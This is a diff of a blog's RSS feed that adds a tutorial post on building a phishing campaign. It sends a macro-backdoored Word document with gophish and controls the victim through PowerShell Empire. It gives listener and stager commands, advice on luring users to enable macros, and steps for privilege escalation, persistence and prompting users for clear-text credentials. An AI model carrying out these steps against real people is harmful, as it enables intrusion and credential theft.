@@ -7,8 +7,147 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Copyright (c) 2014 - 2016; all rights reserved.</copyright>
-    <lastBuildDate>Thu, 18 Aug 2016 20:59:59 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 01 Sep 2016 10:46:59 +0000</lastBuildDate>
     <atom:link href="http://camelinc.info/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Basic Social Engineering example</title>
+      <link>http://camelinc.info/blog/2016/09/Basic-Social-Engineering-example/</link>
+      <pubDate>Thu, 01 Sep 2016 10:46:59 +0000</pubDate>
+      
+      <guid>http://camelinc.info/blog/2016/09/Basic-Social-Engineering-example/</guid>
+      <description>
+
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Word macros are one of the top sources of malware infection.
+Creating such a malicious macro can be done in less than 10 minutes.
+This article will give an insight how to perform such an attack with open-source resources.
+The best is, that it just takes a few minutes.&lt;/p&gt;
+
+&lt;h1 id=&#34;preparation&#34;&gt;Preparation&lt;/h1&gt;
+
+&lt;p&gt;Get a running Kali Linux.
+PowerShell Empire will already be installed.
+This will be our command and control tool.&lt;/p&gt;
+
+&lt;p&gt;Next, download the gophish Docker container.
+This tool is used to perform phishing attacks.
+Once the web interface working, configure the mail options and prepare a phishing mail template.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;dockerpull matteoggl/gophish
+&lt;span class=&#34;nv&#34;&gt;$ &lt;/span&gt;docker run –ti –name gopish –p 3333:3333 –p 8083:80 matteoggl/gophish
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Also, to create the backdoored Office document a version of Microsoft Office is necessary.&lt;/p&gt;
+
+&lt;h1 id=&#34;let-s-go-phishing&#34;&gt;Let&amp;rsquo;s go phishing&lt;/h1&gt;
+
+&lt;p&gt;In Kali Linux start up PowerShell empire.
+First, we need to create a listener that waits for client connections.
+Do not forget to adjust the ip address.
+Subsequently, the malicious macro can be created as a stager.
+The resulting script will be saved in a file to the disk.
+Copy the macro to the Windows box.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt; listeners
+&amp;gt; info
+&amp;gt; &lt;span class=&#34;nb&#34;&gt;set &lt;/span&gt;Name LiveHacking
+&amp;gt; &lt;span class=&#34;nb&#34;&gt;set &lt;/span&gt;Host http://127.0.0.1:8080
+&amp;gt; execute
+...
+&amp;gt; usestager makro officeMacro
+&amp;gt; info
+&amp;gt; &lt;span class=&#34;nb&#34;&gt;set &lt;/span&gt;Listener LiveHacking
+&amp;gt; execute
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;On Windows, create a Word document to hold the macro.
+Also adjust the visible contents to motivate the user to accept the macro.
+Next, the macro has to be added to the document.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/word-macro.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The stager macro after adding it to the Office document.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/word-macro.png&#34; alt=&#34;The stager macro after adding it to the Office document.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The next part is to finalize the phishing campaign.
+Switch to the gophish web interface and configure the phishing mail template.
+Add the backdoored Word document to the mail template.
+Also consider adjusting the text and the subject according to your attack scenario.
+After configuring the target users and groups everything should be set and ready.
+Create the campaign with the right options and start it when ready.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fsmall&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/gophish-overview.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Gophish main interface.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/gophish-overview.png&#34; alt=&#34;Gophish main interface.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Once the victim opens the document the macro will execute.
+Depending on the version and security settings a warning might pop up or sometimes even prevent the macro from executing.
+An agent connection should pop up in PowerShell empire.&lt;/p&gt;
+
+&lt;p&gt;The first steps for the new agent are system enumeration, privilege escalation and persistence.
+PowerShell empire provides a powerup script, that will check the common attack vectors to gain SYSTEM privileges.
+Persistence is necessary if you want to establish a more permanent foothold.
+Finally, we also want to have to clear text credentials from the current user.
+To get those the collection/prompt module can be utilized.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt; usemodule collection/prompt
+&amp;gt; TODO: configure settings
+&amp;gt; execute
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id=&#34;the-victim&#34;&gt;The victim&lt;/h1&gt;
+
+&lt;p&gt;Depending on the scenario the user will be more or less suspecting.
+Some might scan the document with an antivirus software to be safe.
+Unfortunately, the results are quite terrifying.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/virustotal-file-analysis.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Virustotal results for the backdoored office document.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2016/malicious-word-macros/virustotal-file-analysis.png&#34; alt=&#34;Virustotal results for the backdoored office document.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;h1 id=&#34;example-video&#34;&gt;Example Video&lt;/h1&gt;
+
+&lt;p&gt;Here is a video for the sake of completeness.
+Creating a video of the whole attack was quite an experience.
+Good thing that I am not in the movie business.&lt;/p&gt;
+
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/F3RBZ5vM7GM&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+
+
+&lt;h1 id=&#34;links&#34;&gt;Links&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;Empire&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://enigma0x3.net/2016/03/15/phishing-with-empire/&#34;&gt;Phishing with empire&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://getgophish.com/&#34;&gt;gophish&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>SEC660/GXPN Review</title>
